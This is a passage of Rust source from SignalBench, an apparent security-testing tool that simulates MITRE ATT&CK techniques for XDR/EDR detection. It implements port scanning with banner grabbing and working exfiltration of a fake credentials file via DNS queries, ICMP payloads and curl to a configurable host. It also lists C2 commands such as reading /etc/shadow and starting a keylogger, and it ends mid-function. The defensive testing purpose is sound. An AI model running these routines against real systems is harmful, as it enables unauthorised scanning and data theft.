// SIGNALBENCH - Network Techniques
// Network-based attack simulation techniques
// 
// This module contains network-based attacks according to MITRE ATT&CK framework
// Developed by Simon Sigre (simon@gocortex.io)
// Part of the GoCortex.io platform for security testing and validation

use crate::config::TechniqueConfig;
use crate::techniques::{AttackTechnique, CleanupFuture, ExecuteFuture, SimulationResult, Technique, TechniqueParameter};
use async_trait::async_trait;

use std::fs::File;
use std::io::Write;
use std::path::Path;
use tokio::process::Command;
use tokio::time::{sleep, Duration, timeout};
use tokio::net::{TcpStream, UdpSocket};
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use log::{debug, error, info, warn};
use base64::{Engine as _, engine::general_purpose::STANDARD as BASE64};
use std::time::Instant;

// Helper function to get service name based on port number
fn get_service_name(port: u16) -> &'static str {
    match port {
        22 => "SSH",
        23 => "Telnet",
        53 => "DNS",
        80 => "HTTP",
        123 => "NTP",
        161 => "SNMP",
        443 => "HTTPS",
        445 => "SMB",
        514 => "Syslog",
        1337 => "LEET/Backdoor",
        1433 => "MSSQL",
        3306 => "MySQL",
        3389 => "RDP",
        4444 => "Metasploit",
        5432 => "PostgreSQL",
        5555 => "Freeciv/Backdoor",
        5985 => "WinRM",
        6379 => "Redis",
        8080 => "HTTP-ALT",
        8443 => "HTTPS-ALT",
        8888 => "HTTP-Proxy",
        9999 => "Backdoor",
        27017 => "MongoDB",
        31337 => "Elite/Backdoor",
        _ => "Unknown",
    }
}

// Helper function to grab banner from an open TCP connection
async fn grab_banner(stream: &mut TcpStream, port: u16) -> Option<String> {
    let mut buffer = vec![0u8; 2048];
    
    // For some protocols, we need to send a greeting first
    let greeting = match port {
        22 => Some(b"SSH-2.0-SignalBench_1.0\r\n".to_vec()),
        80 | 8080 | 8888 => Some(b"GET / HTTP/1.0\r\nHost: localhost\r\nUser-Agent: SignalBench/1.0\r\n\r\n".to_vec()),
        443 | 8443 => Some(b"GET / HTTP/1.0\r\nHost: localhost\r\n\r\n".to_vec()),
        25 | 587 => Some(b"EHLO signalbench\r\n".to_vec()),
        110 => Some(b"QUIT\r\n".to_vec()),
        3306 => Some(b"\x00".to_vec()),
        5432 => Some(b"\x00\x00\x00\x08\x04\xd2\x16\x2f".to_vec()),
        6379 => Some(b"PING\r\n".to_vec()),
        27017 => Some(b"\x3a\x00\x00\x00\x01\x00\x00\x00".to_vec()),
        _ => None,
    };
    
    // Send greeting if needed
    if let Some(msg) = greeting {
        if let Err(e) = stream.write_all(&msg).await {
            warn!("Failed to send greeting to port {port}: {e}");
            return None;
        }
    }
    
    // Try to read banner with timeout
    match timeout(Duration::from_secs(2), stream.read(&mut buffer)).await {
        Ok(Ok(n)) if n > 0 => {
            // Convert to UTF-8, replacing invalid chars
            let banner = String::from_utf8_lossy(&buffer[..n]).to_string();
            // Only return if we got meaningful data
            if !banner.trim().is_empty() {
                Some(banner)
            } else {
                None
            }
        },
        Ok(Ok(_)) => None, // No data received
        Ok(Err(e)) => {
            debug!("Error reading banner from port {port}: {e}");
            None
        },
        Err(_) => {
            debug!("Banner grab timeout for port {port}");
            None
        }
    }
}

// Helper function to probe UDP port
async fn probe_udp_port(host: &str, port: u16) -> Result<bool, String> {
    let bind_addr = if host.contains(':') {
        "[::]:0"  // IPv6
    } else {
        "0.0.0.0:0"  // IPv4
    };
    
    let socket = UdpSocket::bind(bind_addr)
        .await
        .map_err(|e| format!("Failed to bind UDP socket: {e}"))?;
    
    let target_addr = format!("{host}:{port}");
    
    // Prepare protocol-specific probe
    let probe = match port {
        53 => b"\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x07example\x03com\x00\x00\x01\x00\x01".to_vec(),
        123 => b"\x1b\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".to_vec(),
        161 => b"\x30\x26\x02\x01\x00\x04\x06\x70\x75\x62\x6c\x69\x63\xa0\x19\x02\x04\x00\x00\x00\x00\x02\x01\x00\x02\x01\x00\x30\x0b\x30\x09\x06\x05\x2b\x06\x01\x02\x01\x05\x00".to_vec(),
        514 => b"<14>SignalBench test message\n".to_vec(),
        _ => b"SignalBench UDP probe\n".to_vec(),
    };
    
    // Send probe
    match timeout(Duration::from_secs(1), socket.send_to(&probe, &target_addr)).await {
        Ok(Ok(_)) => {
            // Try to receive response
            let mut buf = vec![0u8; 1024];
            match timeout(Duration::from_secs(1), socket.recv_from(&mut buf)).await {
                Ok(Ok(_)) => Ok(true),
                _ => Ok(false),
            }
        },
        _ => Ok(false),
    }
}

// ======================================
// T1046 - Network Service Discovery
// ======================================
pub struct NetworkServiceDiscovery {}

#[async_trait]
impl AttackTechnique for NetworkServiceDiscovery {
    fn info(&self) -> Technique {
        Technique {
            id: "T1046".to_string(),
            name: "Network Service Discovery".to_string(),
            description: "Performs comprehensive network service discovery using TCP/UDP connection attempts and enhanced banner grabbing. Scans common ports (1-1024) plus suspicious backdoor ports (1337, 4444, 31337, etc.) across multiple localhost interfaces. Includes protocol-specific probes for SSH, HTTP, MySQL, PostgreSQL, Redis, MongoDB, and more. This generates high volume network traffic designed to trigger XDR/EDR detection (not simulation).".to_string(),
            category: "DISCOVERY".to_string(),
            parameters: vec![
                TechniqueParameter {
                    name: "target_hosts".to_string(),
                    description: "Target hosts to scan (comma-separated IPs). Default scans multiple localhost interfaces.".to_string(),
                    required: true,
                    default: Some("127.0.0.1,::1".to_string()),
                },
                TechniqueParameter {
                    name: "ports".to_string(),
                    description: "Ports to scan (e.g., 22,80,443 or 1-1024). Default is comprehensive scan of 1-1024 plus backdoor ports.".to_string(),
                    required: true,
                    default: Some("1-1024,1337,4444,5555,8443,8888,9999,31337".to_string()),
                },
                TechniqueParameter {
                    name: "enable_udp".to_string(),
                    description: "Enable UDP scanning on ports 53,123,161,514 (true/false)".to_string(),
                    required: false,
                    default: Some("true".to_string()),
                },
                TechniqueParameter {
                    name: "output_file".to_string(),
                    description: "Path to save scan results".to_string(),
                    required: false,
                    default: Some("/tmp/signalbench_port_scan_results.txt".to_string()),
                },
            ],
            detection: "Network monitoring and XDR/EDR tools can detect port scanning activity via high connection rate, multiple TCP/UDP probes, and suspicious port access patterns (backdoor ports 1337, 4444, 31337). Banner grabbing generates protocol-specific traffic patterns.".to_string(),
            cleanup_support: true,
            platforms: vec!["Linux".to_string()],
            permissions: vec!["user".to_string()],
            voltron_only: false,
        }
    }

    fn execute<'a>(
        &'a self,
        config: &'a TechniqueConfig,
        dry_run: bool,
    ) -> ExecuteFuture<'a> {
        Box::pin(async move {
            let technique_info = self.info();
            let scan_start = Instant::now();
            
            // Get parameters from config or use defaults
            let target_hosts = config
                .parameters
                .get("target_hosts")
                .unwrap_or(&"127.0.0.1,::1".to_string())
                .clone();
            let ports = config
                .parameters
                .get("ports")
                .unwrap_or(&"1-1024,1337,4444,5555,8443,8888,9999,31337".to_string())
                .clone();
            let enable_udp = config
                .parameters
                .get("enable_udp")
                .unwrap_or(&"true".to_string())
                .to_lowercase() == "true";
            let output_file = config
                .parameters
                .get("output_file")
                .unwrap_or(&"/tmp/signalbench_port_scan_results.txt".to_string())
                .clone();
            
            if dry_run {
                let udp_msg = if enable_udp { " with UDP scanning" } else { "" };
                return Ok(SimulationResult {
                    technique_id: technique_info.id,
                    success: true,
                    message: format!("Would perform comprehensive TCP{udp_msg} port scanning on {target_hosts} for ports {ports} and save results to {output_file}"),
                    artifacts: vec![output_file],
                    cleanup_required: true,
                });
            }
            
            // Parse target hosts (comma-separated values)
            let hosts: Vec<String> = target_hosts.split(',').map(|s| s.trim().to_string()).collect();
            
            // Parse ports (ranges like "1-1024" or single ports like "80,443")
            let mut port_list = Vec::new();
            for port_spec in ports.split(',') {
                let trimmed = port_spec.trim();
                if trimmed.contains('-') {
                    let range: Vec<&str> = trimmed.split('-').collect();
                    if range.len() == 2 {
                        if let (Ok(start), Ok(end)) = (range[0].parse::<u16>(), range[1].parse::<u16>()) {
                            // Allow full range for comprehensive scanning
                            for port in start..=end {
                                port_list.push(port);
                            }
                        }
                    }
                } else if let Ok(port) = trimmed.parse::<u16>() {
                    port_list.push(port);
                }
            }
            
            // Define UDP ports to scan if enabled
            let udp_ports: Vec<u16> = if enable_udp {
                vec![53, 123, 161, 514]
            } else {
                vec![]
            };
            
            // Create output file
            let mut file = File::create(&output_file)
                .map_err(|e| format!("Failed to create output file: {e}"))?;
                
            writeln!(file, "# SignalBench Network Service Discovery - REAL TCP/UDP Scanning").unwrap();
            writeln!(file, "# MITRE ATT&CK Technique: T1046").unwrap();
            writeln!(file, "# Target hosts: {target_hosts}").unwrap();
            writeln!(file, "# TCP ports to scan: {ports} ({} total ports)", port_list.len()).unwrap();
            if enable_udp {
                writeln!(file, "# UDP ports to scan: 53, 123, 161, 514").unwrap();
            }
            writeln!(file, "# Banner grab buffer: 2048 bytes with protocol-specific probes").unwrap();
            writeln!(file, "# Scan started: {}", chrono::Local::now()).unwrap();
            writeln!(file, "# WARNING: This performs comprehensive TCP/UDP connection attempts").unwrap();
            writeln!(file, "# WARNING: Designed to generate high volume traffic for XDR/EDR detection").unwrap();
            writeln!(file, "# ========================================================").unwrap();
            
            let mut total_ports_scanned = 0;
            let mut total_open_ports = 0;
            let mut total_banners_grabbed = 0;
            let mut total_udp_probes = 0;
            let mut total_udp_responses = 0;
            
            // Perform real TCP scanning on all targets
            for host in &hosts {
                writeln!(file, "\n[*] Scanning host: {host}").unwrap();
                writeln!(file, "[*] {} ports to scan", port_list.len()).unwrap();
                
                for port in &port_list {
                    total_ports_scanned += 1;
                    let addr = format!("{host}:{port}");
                    
                    // Attempt real TCP connection with 2 second timeout
                    match timeout(Duration::from_secs(2), TcpStream::connect(&addr)).await {
                        Ok(Ok(mut stream)) => {
                            // Port is OPEN
                            total_open_ports += 1;
                            let service_name = get_service_name(*port);
                            
                            writeln!(file,"\nPort {port:5} - OPEN - {service_name}").unwrap();
                            info!("Port {port} on {host} is OPEN - attempting banner grab");
                            
                            // Attempt banner grabbing
                            let banner = grab_banner(&mut stream, *port).await;
                            
                            if let Some(banner_text) = banner {
                                total_banners_grabbed += 1;
                                writeln!(file, "  Banner: {}", banner_text.trim()).unwrap();
                                debug!("Grabbed banner from {host}:{port}: {}", banner_text.trim());
                            } else {
                                writeln!(file, "  Banner: <no banner received>").unwrap();
                            }
                        },
                        Ok(Err(e)) => {
                            // Connection refused or other error - port is CLOSED
                            writeln!(file,"Port {port:5} - CLOSED - {e}").unwrap();
                            debug!("Port {port} on {host} is CLOSED: {e}");
                        },
                        Err(_) => {
                            // Timeout - port is likely FILTERED or CLOSED
                            writeln!(file,"Port {port:5} - FILTERED/TIMEOUT").unwrap();
                            debug!("Port {port} on {host} timed out");
                        }
                    }
                    
                    // Small delay to avoid overwhelming the target
                    sleep(Duration::from_millis(10)).await;
                }
                
                writeln!(file, "\n[*] TCP scan complete for {host}").unwrap();
                
                // Perform UDP scanning if enabled
                if !udp_ports.is_empty() {
                    writeln!(file, "\n[*] Starting UDP scan on {host}").unwrap();
                    writeln!(file, "[*] UDP ports to probe: {udp_ports:?}").unwrap();
                    writeln!(file, "[*] Note: UDP scanning is less reliable (no responses may not mean closed)").unwrap();
                    
                    for port in &udp_ports {
                        total_udp_probes += 1;
                        let service_name = get_service_name(*port);
                        
                        writeln!(file, "\nUDP Port {port:5} - {service_name}").unwrap();
                        info!("Probing UDP port {port} on {host}");
                        
                        match probe_udp_port(host, *port).await {
                            Ok(true) => {
                                total_udp_responses += 1;
                                writeln!(file, "  Status: RESPONSE RECEIVED (likely open)").unwrap();
                                info!("UDP port {port} on {host} responded");
                            },
                            Ok(false) => {
                                writeln!(file, "  Status: NO RESPONSE (open/filtered/closed)").unwrap();
                                debug!("UDP port {port} on {host} did not respond");
                            },
                            Err(e) => {
                                writeln!(file, "  Status: ERROR - {e}").unwrap();
                                warn!("UDP probe error on {host}:{port}: {e}");
                            }
                        }
                        
                        // Small delay between UDP probes
                        sleep(Duration::from_millis(50)).await;
                    }
                    
                    writeln!(file, "\n[*] UDP scan complete for {host}").unwrap();
                }
            }
            
            let scan_duration = scan_start.elapsed();
            
            writeln!(file, "\n========================================================").unwrap();
            writeln!(file, "# SCAN SUMMARY").unwrap();
            writeln!(file, "# Total TCP ports scanned: {total_ports_scanned}").unwrap();
            writeln!(file, "# Open TCP ports found: {total_open_ports}").unwrap();
            writeln!(file, "# Banners grabbed: {total_banners_grabbed}").unwrap();
            if enable_udp {
                writeln!(file, "# Total UDP probes sent: {total_udp_probes}").unwrap();
                writeln!(file, "# UDP responses received: {total_udp_responses}").unwrap();
            }
            writeln!(file, "# Total network connections: {}", total_ports_scanned + total_udp_probes).unwrap();
            writeln!(file, "# Scan duration: {:.2}s", scan_duration.as_secs_f64()).unwrap();
            writeln!(file, "# Connection rate: {:.2} conn/sec", (total_ports_scanned + total_udp_probes) as f64 / scan_duration.as_secs_f64()).unwrap();
            writeln!(file, "# Scan completed: {}", chrono::Local::now()).unwrap();
            writeln!(file, "========================================================").unwrap();
            
            drop(file);
            
            let summary = if enable_udp {
                format!(
                    "Comprehensive TCP/UDP scan completed: {} TCP ports scanned ({} open, {} banners), {} UDP probes ({} responses), {:.2} conn/sec in {:.2}s",
                    total_ports_scanned, total_open_ports, total_banners_grabbed, 
                    total_udp_probes, total_udp_responses,
                    (total_ports_scanned + total_udp_probes) as f64 / scan_duration.as_secs_f64(),
                    scan_duration.as_secs_f64()
                )
            } else {
                format!(
                    "Comprehensive TCP scan completed: {} ports scanned, {} open, {} banners grabbed, {:.2} conn/sec in {:.2}s",
                    total_ports_scanned, total_open_ports, total_banners_grabbed,
                    total_ports_scanned as f64 / scan_duration.as_secs_f64(),
                    scan_duration.as_secs_f64()
                )
            };
            
            info!("{summary}");
            println!("\n[T1046] {summary}");
            println!("[T1046] Scanned {} hosts across {} interfaces", hosts.len(), if hosts.len() > 1 { "multiple" } else { "single" });
            println!("[T1046] Detailed results saved to: {output_file}");
            
            Ok(SimulationResult {
                technique_id: technique_info.id,
                success: true,
                message: summary,
                artifacts: vec![output_file.to_string()],
                cleanup_required: true,
            })
        })
    }

    fn cleanup<'a>(&'a self, artifacts: &'a [String]) -> CleanupFuture<'a> {
        Box::pin(async move {
            for artifact in artifacts {
                if Path::new(artifact).exists() {
                    // Check if it's a directory
                    if Path::new(artifact).is_dir() {
                        if let Err(e) = std::fs::remove_dir_all(artifact) {
                            error!("Failed to remove directory {artifact}: {e}");
                        } else {
                            debug!("Removed directory: {artifact}");
                        }
                    } else if let Err(e) = std::fs::remove_file(artifact) {
                        error!("Failed to remove artifact {artifact}: {e}");
                    } else {
                        debug!("Removed artifact: {artifact}");
                    }
                }
            }
            Ok(())
        })
    }
}

// ======================================
// T1048 - Exfiltration Over Alternative Protocol
// ======================================
pub struct ExfiltrationOverAlternativeProtocol {}

#[async_trait]
impl AttackTechnique for ExfiltrationOverAlternativeProtocol {
    fn info(&self) -> Technique {
        Technique {
            id: "T1048".to_string(),
            name: "Exfiltration Over Alternative Protocol".to_string(),
            description: "Generates telemetry for data exfiltration using alternative protocols like DNS or ICMP".to_string(),
            category: "EXFILTRATION".to_string(),
            parameters: vec![
                TechniqueParameter {
                    name: "protocol".to_string(),
                    description: "Protocol to use for exfiltration (dns, icmp, http)".to_string(),
                    required: true,
                    default: Some("dns".to_string()),
                },
                TechniqueParameter {
                    name: "data_file".to_string(),
                    description: "Path to save test data to be exfiltrated".to_string(),
                    required: false,
                    default: Some("/tmp/signalbench_exfil_data.txt".to_string()),
                },
                TechniqueParameter {
                    name: "log_file".to_string(),
                    description: "Path to save exfiltration log".to_string(),
                    required: false,
                    default: Some("/tmp/signalbench_exfil_log.txt".to_string()),
                },
                TechniqueParameter {
                    name: "target".to_string(),
                    description: "Target for exfiltration (domain for DNS, IP for ICMP, URL for HTTP)".to_string(),
                    required: false,
                    default: Some("example.com".to_string()),
                },
            ],
            detection: "Network monitoring can detect unusual DNS queries, ICMP traffic, or HTTP requests".to_string(),
            cleanup_support: true,
            platforms: vec!["Linux".to_string()],
            permissions: vec!["user".to_string()],
            voltron_only: false,
        }
    }

    fn execute<'a>(
        &'a self,
        config: &'a TechniqueConfig,
        dry_run: bool,
    ) -> ExecuteFuture<'a> {
        Box::pin(async move {
            let technique_info = self.info();
            
            // Get parameters from config or use defaults
            let protocol = config
                .parameters
                .get("protocol")
                .unwrap_or(&"dns".to_string())
                .clone();
            let data_file = config
                .parameters
                .get("data_file")
                .unwrap_or(&"/tmp/signalbench_exfil_data.txt".to_string())
                .clone();
            let log_file = config
                .parameters
                .get("log_file")
                .unwrap_or(&"/tmp/signalbench_exfil_log.txt".to_string())
                .clone();
            let target = config
                .parameters
                .get("target")
                .unwrap_or(&"example.com".to_string())
                .clone();
            
            if dry_run {
                return Ok(SimulationResult {
                    technique_id: technique_info.id,
                    success: true,
                    message: format!("Would perform data exfiltration using {protocol} protocol to {target} and save logs to {log_file}"),
                    artifacts: vec![data_file.clone(), log_file.clone()],
                    cleanup_required: true,
                });
            }
            
            // Create sample data file
            let mut file = File::create(&data_file)
                .map_err(|e| format!("Failed to create data file: {e}"))?;
            
            // Create test sensitive data for exfiltration telemetry
            writeln!(file, "CONFIDENTIAL - Internal Use Only").unwrap();
            writeln!(file, "User database credentials:").unwrap();
            writeln!(file, "  Database: production_db").unwrap();
            writeln!(file, "  Username: db_admin").unwrap();
            writeln!(file, "  Password: TestPassword1234!").unwrap();
            writeln!(file, "API Keys:").unwrap();
            writeln!(file, "  AWS: AKIA0123456789SAMPLE").unwrap();
            writeln!(file, "  Google: AIzaSyDSIMULATED_KEY_123456789").unwrap();
            writeln!(file, "Employee records:").unwrap();
            for i in 1..6 {
                writeln!(file, "  Employee #{i}: John Doe {i}, SSN: 123-45-678{i}, DOB: 01/0{i}/1980").unwrap();
            }
            
            // Close data file
            drop(file);
            
            // Create log file
            let mut log_file_handle = File::create(&log_file)
                .map_err(|e| format!("Failed to create log file: {e}"))?;
                
            // Write header
            writeln!(log_file_handle, "# SignalBench Exfiltration Over Alternative Protocol").unwrap();
            writeln!(log_file_handle, "# MITRE ATT&CK Technique: T1048").unwrap();
            writeln!(log_file_handle, "# Protocol: {protocol}").unwrap();
            writeln!(log_file_handle, "# Target: {target}").unwrap();
            writeln!(log_file_handle, "# Data file: {data_file}").unwrap();
            writeln!(log_file_handle, "# Timestamp: {}", chrono::Local::now()).unwrap();
            writeln!(log_file_handle, "# --------------------------------------------------------").unwrap();
            
            // Simulate exfiltration process based on the selected protocol
            match protocol.to_lowercase().as_str() {
                "dns" => {
                    writeln!(log_file_handle, "\n## DNS Exfiltration - Actual Network Traffic").unwrap();
                    
                    // Read the data file
                    let data = std::fs::read_to_string(&data_file)
                        .map_err(|e| format!("Failed to read data file: {e}"))?;
                    
                    // Split data into chunks (DNS has length limitations)
                    let chunks: Vec<&str> = data.split_whitespace().collect();
                    
                    writeln!(log_file_handle, "Encoding data into Base64 before exfiltration...").unwrap();
                    let mut successful_exfils = 0;
                    
                    for (i, chunk) in chunks.iter().enumerate() {
                        // Base64 encode the data
                        let encoded = BASE64.encode(chunk);
                        // Truncate encoded data to reasonable size for DNS
                        let encoded = &encoded[0..std::cmp::min(encoded.len(), 30)];
                        
                        // Create the DNS query
                        let subdomain = encoded.to_lowercase().to_string();
                        let query = format!("{subdomain}.{target}");
                        
                        writeln!(log_file_handle, "[{}] Exfiltrating chunk: {} -> DNS query: {}", 
                            i + 1, chunk, query).unwrap();
                        
                        // Actually perform the DNS lookup using dig command
                        let output = Command::new("dig")
                            .arg(&query)
                            .arg("+short")
                            .output()
                            .await;
                            
                        match output {
                            Ok(result) => {
                                let status = result.status.code().unwrap_or(-1);
                                let stdout = String::from_utf8_lossy(&result.stdout);
                                let stderr = String::from_utf8_lossy(&result.stderr);
                                
                                writeln!(log_file_handle, "    Status: {status}").unwrap();
                                if !stdout.is_empty() {
                                    writeln!(log_file_handle, "    Response: {stdout}").unwrap();
                                }
                                if !stderr.is_empty() {
                                    writeln!(log_file_handle, "    Error: {stderr}").unwrap();
                                }
                                
                                successful_exfils += 1;
                            },
                            Err(e) => {
                                writeln!(log_file_handle, "    Failed to execute DNS query: {e}").unwrap();
                            }
                        }
                        
                        // Add delay between requests to avoid flooding
                        sleep(Duration::from_millis(100)).await;
                    }
                    
                    writeln!(log_file_handle, "\nExfiltration complete - {}/{} chunks of data sent via actual DNS queries", 
                        successful_exfils, chunks.len()).unwrap();
                },
                "icmp" => {
                    writeln!(log_file_handle, "\n## ICMP Exfiltration - Actual Network Traffic").unwrap();
                    
                    // Read the data file
                    let data = std::fs::read_to_string(&data_file)
                        .map_err(|e| format!("Failed to read data file: {e}"))?;
                    
                    // Split data into chunks
                    let chunks: Vec<&str> = data.lines().collect();
                    
                    writeln!(log_file_handle, "Preparing data for ICMP exfiltration...").unwrap();
                    let mut successful_exfils = 0;
                    
                    for (i, chunk) in chunks.iter().enumerate() {
                        // Encode data in hex for ICMP payload
                        let hex_data = hex::encode(chunk.as_bytes());
                        let hex_pattern = if hex_data.len() >= 16 { 
                            hex_data[0..16].to_string() 
                        } else { 
                            hex_data.clone() 
                        };
                        
                        writeln!(log_file_handle, "[{}] Exfiltrating: {}", i + 1, chunk).unwrap();
                        
                        // Actually execute ping with payload - this will send real ICMP packets
                        let output = Command::new("ping")
                            .arg("-c")
                            .arg("1")
                            .arg("-p")
                            .arg(&hex_pattern)
                            .arg(&target)
                            .output()
                            .await;
                            
                        match output {
                            Ok(result) => {
                                let status = result.status.code().unwrap_or(-1);
                                let stdout = String::from_utf8_lossy(&result.stdout);
                                let stderr = String::from_utf8_lossy(&result.stderr);
                                
                                writeln!(log_file_handle, "    Status: {status}").unwrap();
                                if status == 0 {
                                    successful_exfils += 1;
                                }
                                
                                if !stdout.is_empty() {
                                    let summary = if stdout.len() > 200 {
                                        format!("{}... (truncated)", &stdout[0..200])
                                    } else {
                                        stdout.to_string()
                                    };
                                    writeln!(log_file_handle, "    Response: {summary}").unwrap();
                                }
                                
                                if !stderr.is_empty() {
                                    writeln!(log_file_handle, "    Error: {stderr}").unwrap();
                                }
                            },
                            Err(e) => {
                                writeln!(log_file_handle, "    Failed to execute ICMP packet: {e}").unwrap();
                            }
                        }
                        
                        // Add delay between packets to avoid flooding
                        sleep(Duration::from_millis(200)).await;
                    }
                    
                    writeln!(log_file_handle, "\nExfiltration complete - {}/{} chunks of data sent via actual ICMP packets", 
                        successful_exfils, chunks.len()).unwrap();
                },
                "http" => {
                    writeln!(log_file_handle, "\n## HTTP Exfiltration - Actual Network Traffic").unwrap();
                    
                    // Read the data file
                    let data = std::fs::read_to_string(&data_file)
                        .map_err(|e| format!("Failed to read data file: {e}"))?;
                    
                    // Split data into chunks
                    let chunks: Vec<&str> = data.lines().collect();
                    
                    writeln!(log_file_handle, "Preparing data for HTTP exfiltration...").unwrap();
                    let mut successful_exfils = 0;
                    
                    for (i, chunk) in chunks.iter().enumerate() {
                        // Encode data for HTTP request
                        let encoded = BASE64.encode(chunk);
                        
                        writeln!(log_file_handle, "[{}] Exfiltrating: {}", i + 1, chunk).unwrap();
                        
                        // Using curl to actually send HTTP request with encoded data
                        // Use a target URL (defaults to example.com if not specified)
                        let url = format!("{target}/exfil?data={encoded}");
                        let output = Command::new("curl")
                            .arg("-s")
                            .arg("-m")  // timeout in seconds
                            .arg("5")
                            .arg(&url)
                            .output()
                            .await;
                            
                        match output {
                            Ok(result) => {
                                let status = result.status.code().unwrap_or(-1);
                                let stdout = String::from_utf8_lossy(&result.stdout);
                                let stderr = String::from_utf8_lossy(&result.stderr);
                                
                                writeln!(log_file_handle, "    Status: {status}").unwrap();
                                if status == 0 {
                                    successful_exfils += 1;
                                }
                                
                                if !stdout.is_empty() {
                                    let summary = if stdout.len() > 200 {
                                        format!("{}... (truncated)", &stdout[0..200])
                                    } else {
                                        stdout.to_string()
                                    };
                                    writeln!(log_file_handle, "    Response: {summary}").unwrap();
                                }
                                
                                if !stderr.is_empty() {
                                    writeln!(log_file_handle, "    Error: {stderr}").unwrap();
                                }
                            },
                            Err(e) => {
                                writeln!(log_file_handle, "    Failed to execute HTTP request: {e}").unwrap();
                            }
                        }
                        
                        // Add delay between requests to avoid flooding
                        sleep(Duration::from_millis(150)).await;
                    }
                    
                    writeln!(log_file_handle, "\nExfiltration complete - {}/{} chunks of data sent via actual HTTP requests", 
                        successful_exfils, chunks.len()).unwrap();
                },
                _ => {
                    writeln!(log_file_handle, "\n## ERROR: Unsupported protocol '{protocol}'").unwrap();
                    writeln!(log_file_handle, "Supported protocols: dns, icmp, http").unwrap();
                }
            }
            
            // Close log file
            drop(log_file_handle);
            
            info!("Exfiltration simulation complete, logs saved to {log_file}");
            
            Ok(SimulationResult {
                technique_id: technique_info.id,
                success: true,
                message: format!("Exfiltration over {protocol} simulation completed. Data file: {data_file}, Logs: {log_file}"),
                artifacts: vec![data_file.to_string(), log_file.to_string()],
                cleanup_required: true,
            })
        })
    }

    fn cleanup<'a>(&'a self, artifacts: &'a [String]) -> CleanupFuture<'a> {
        Box::pin(async move {
            for artifact in artifacts {
                if Path::new(artifact).exists() {
                    // Check if it's a directory
                    if Path::new(artifact).is_dir() {
                        if let Err(e) = std::fs::remove_dir_all(artifact) {
                            error!("Failed to remove directory {artifact}: {e}");
                        } else {
                            debug!("Removed directory: {artifact}");
                        }
                    } else if let Err(e) = std::fs::remove_file(artifact) {
                        error!("Failed to remove artifact {artifact}: {e}");
                    } else {
                        debug!("Removed artifact: {artifact}");
                    }
                }
            }
            Ok(())
        })
    }
}

// ======================================
// T1095 - Non-Application Layer Protocol
// ======================================
pub struct NonApplicationLayerProtocol {}

#[async_trait]
impl AttackTechnique for NonApplicationLayerProtocol {
    fn info(&self) -> Technique {
        Technique {
            id: "T1095".to_string(),
            name: "Non-Application Layer Protocol".to_string(),
            description: "Generates telemetry for non-application layer protocol C2 communications".to_string(),
            category: "COMMAND_AND_CONTROL".to_string(),
            parameters: vec![
                TechniqueParameter {
                    name: "protocol".to_string(),
                    description: "Protocol to use for telemetry generation (icmp, tcp, udp)".to_string(),
                    required: true,
                    default: Some("tcp".to_string()),
                },
                TechniqueParameter {
                    name: "target".to_string(),
                    description: "Target IP address".to_string(),
                    required: true,
                    default: Some("127.0.0.1".to_string()),
                },
                TechniqueParameter {
                    name: "port".to_string(),
                    description: "Target port (for TCP/UDP)".to_string(),
                    required: false,
                    default: Some("4444".to_string()),
                },
                TechniqueParameter {
                    name: "log_file".to_string(),
                    description: "Path to save C2 simulation log".to_string(),
                    required: false,
                    default: Some("/tmp/signalbench_c2_simulation.txt".to_string()),
                },
                TechniqueParameter {
                    name: "command_file".to_string(),
                    description: "Path to save test C2 commands".to_string(),
                    required: false,
                    default: Some("/tmp/signalbench_c2_commands.txt".to_string()),
                },
            ],
            detection: "Network monitoring can detect unusual protocol usage and non-standard communications".to_string(),
            cleanup_support: true,
            platforms: vec!["Linux".to_string()],
            permissions: vec!["user".to_string()],
            voltron_only: false,
        }
    }

    fn execute<'a>(
        &'a self,
        config: &'a TechniqueConfig,
        dry_run: bool,
    ) -> ExecuteFuture<'a> {
        Box::pin(async move {
            let technique_info = self.info();
            
            // Get parameters from config or use defaults
            let protocol = config
                .parameters
                .get("protocol")
                .unwrap_or(&"tcp".to_string())
                .clone();
            let target = config
                .parameters
                .get("target")
                .unwrap_or(&"127.0.0.1".to_string())
                .clone();
            let port = config
                .parameters
                .get("port")
                .unwrap_or(&"4444".to_string())
                .clone();
            let log_file = config
                .parameters
                .get("log_file")
                .unwrap_or(&"/tmp/signalbench_c2_simulation.txt".to_string())
                .clone();
            let command_file = config
                .parameters
                .get("command_file")
                .unwrap_or(&"/tmp/signalbench_c2_commands.txt".to_string())
                .clone();
            
            if dry_run {
                return Ok(SimulationResult {
                    technique_id: technique_info.id,
                    success: true,
                    message: format!("Would perform C2 communications using {protocol} protocol to {target}:{port} and save logs to {log_file}"),
                    artifacts: vec![log_file.clone(), command_file.clone()],
                    cleanup_required: true,
                });
            }
            
            // Create command file with test C2 commands
            let mut cmd_file = File::create(&command_file)
                .map_err(|e| format!("Failed to create command file: {e}"))?;
                
            // Write simulated C2 commands
            writeln!(cmd_file, "# Test C2 Commands").unwrap();
            writeln!(cmd_file, "whoami").unwrap();
            writeln!(cmd_file, "hostname").unwrap();
            writeln!(cmd_file, "ip addr").unwrap();
            writeln!(cmd_file, "cat /etc/passwd").unwrap();
            writeln!(cmd_file, "ps aux").unwrap();
            writeln!(cmd_file, "ls -la /root").unwrap();
            writeln!(cmd_file, "find / -perm -4000 -type f").unwrap();
            writeln!(cmd_file, "download /etc/shadow").unwrap();
            writeln!(cmd_file, "keylog start").unwrap();
            writeln!(cmd_file, "screenshot").unwrap();
            
            // Close command file
            drop(cmd_file);
            
            // Create log file
            let mut log_file_handle = File::create(&log_file)
                .map_err(|e| format!("Failed to create log file: {e}"))?;
                
            // Write header
            writeln!(log_file_handle, "# SignalBench Non-Application Layer Protocol C2").unwrap();
            writeln!(log_file_handle, "# MITRE ATT&CK Technique: T1095").unwrap();
            writeln!(log_file_handle, "# Protocol: {protocol}").unwrap();
            writeln!(log_file_handle, "# Target: {target}:{port}").unwrap();
            writeln!(log_file_handle, "# Command file: {command_file}").unwrap();
            writeln!(log_file_handle, "# Timestamp: {}", chrono::Local::now()).unwrap();
            writeln!(log_file_handle, "# --------------------------------------------------------").unwrap();
            
            // Read commands from file
            let commands = std::fs::read_to_string(&command_file)
                .map_err(|e| format!("Failed to read command file: {e}"))?;
                
            let command_lines: Vec<&str> = commands.lines()
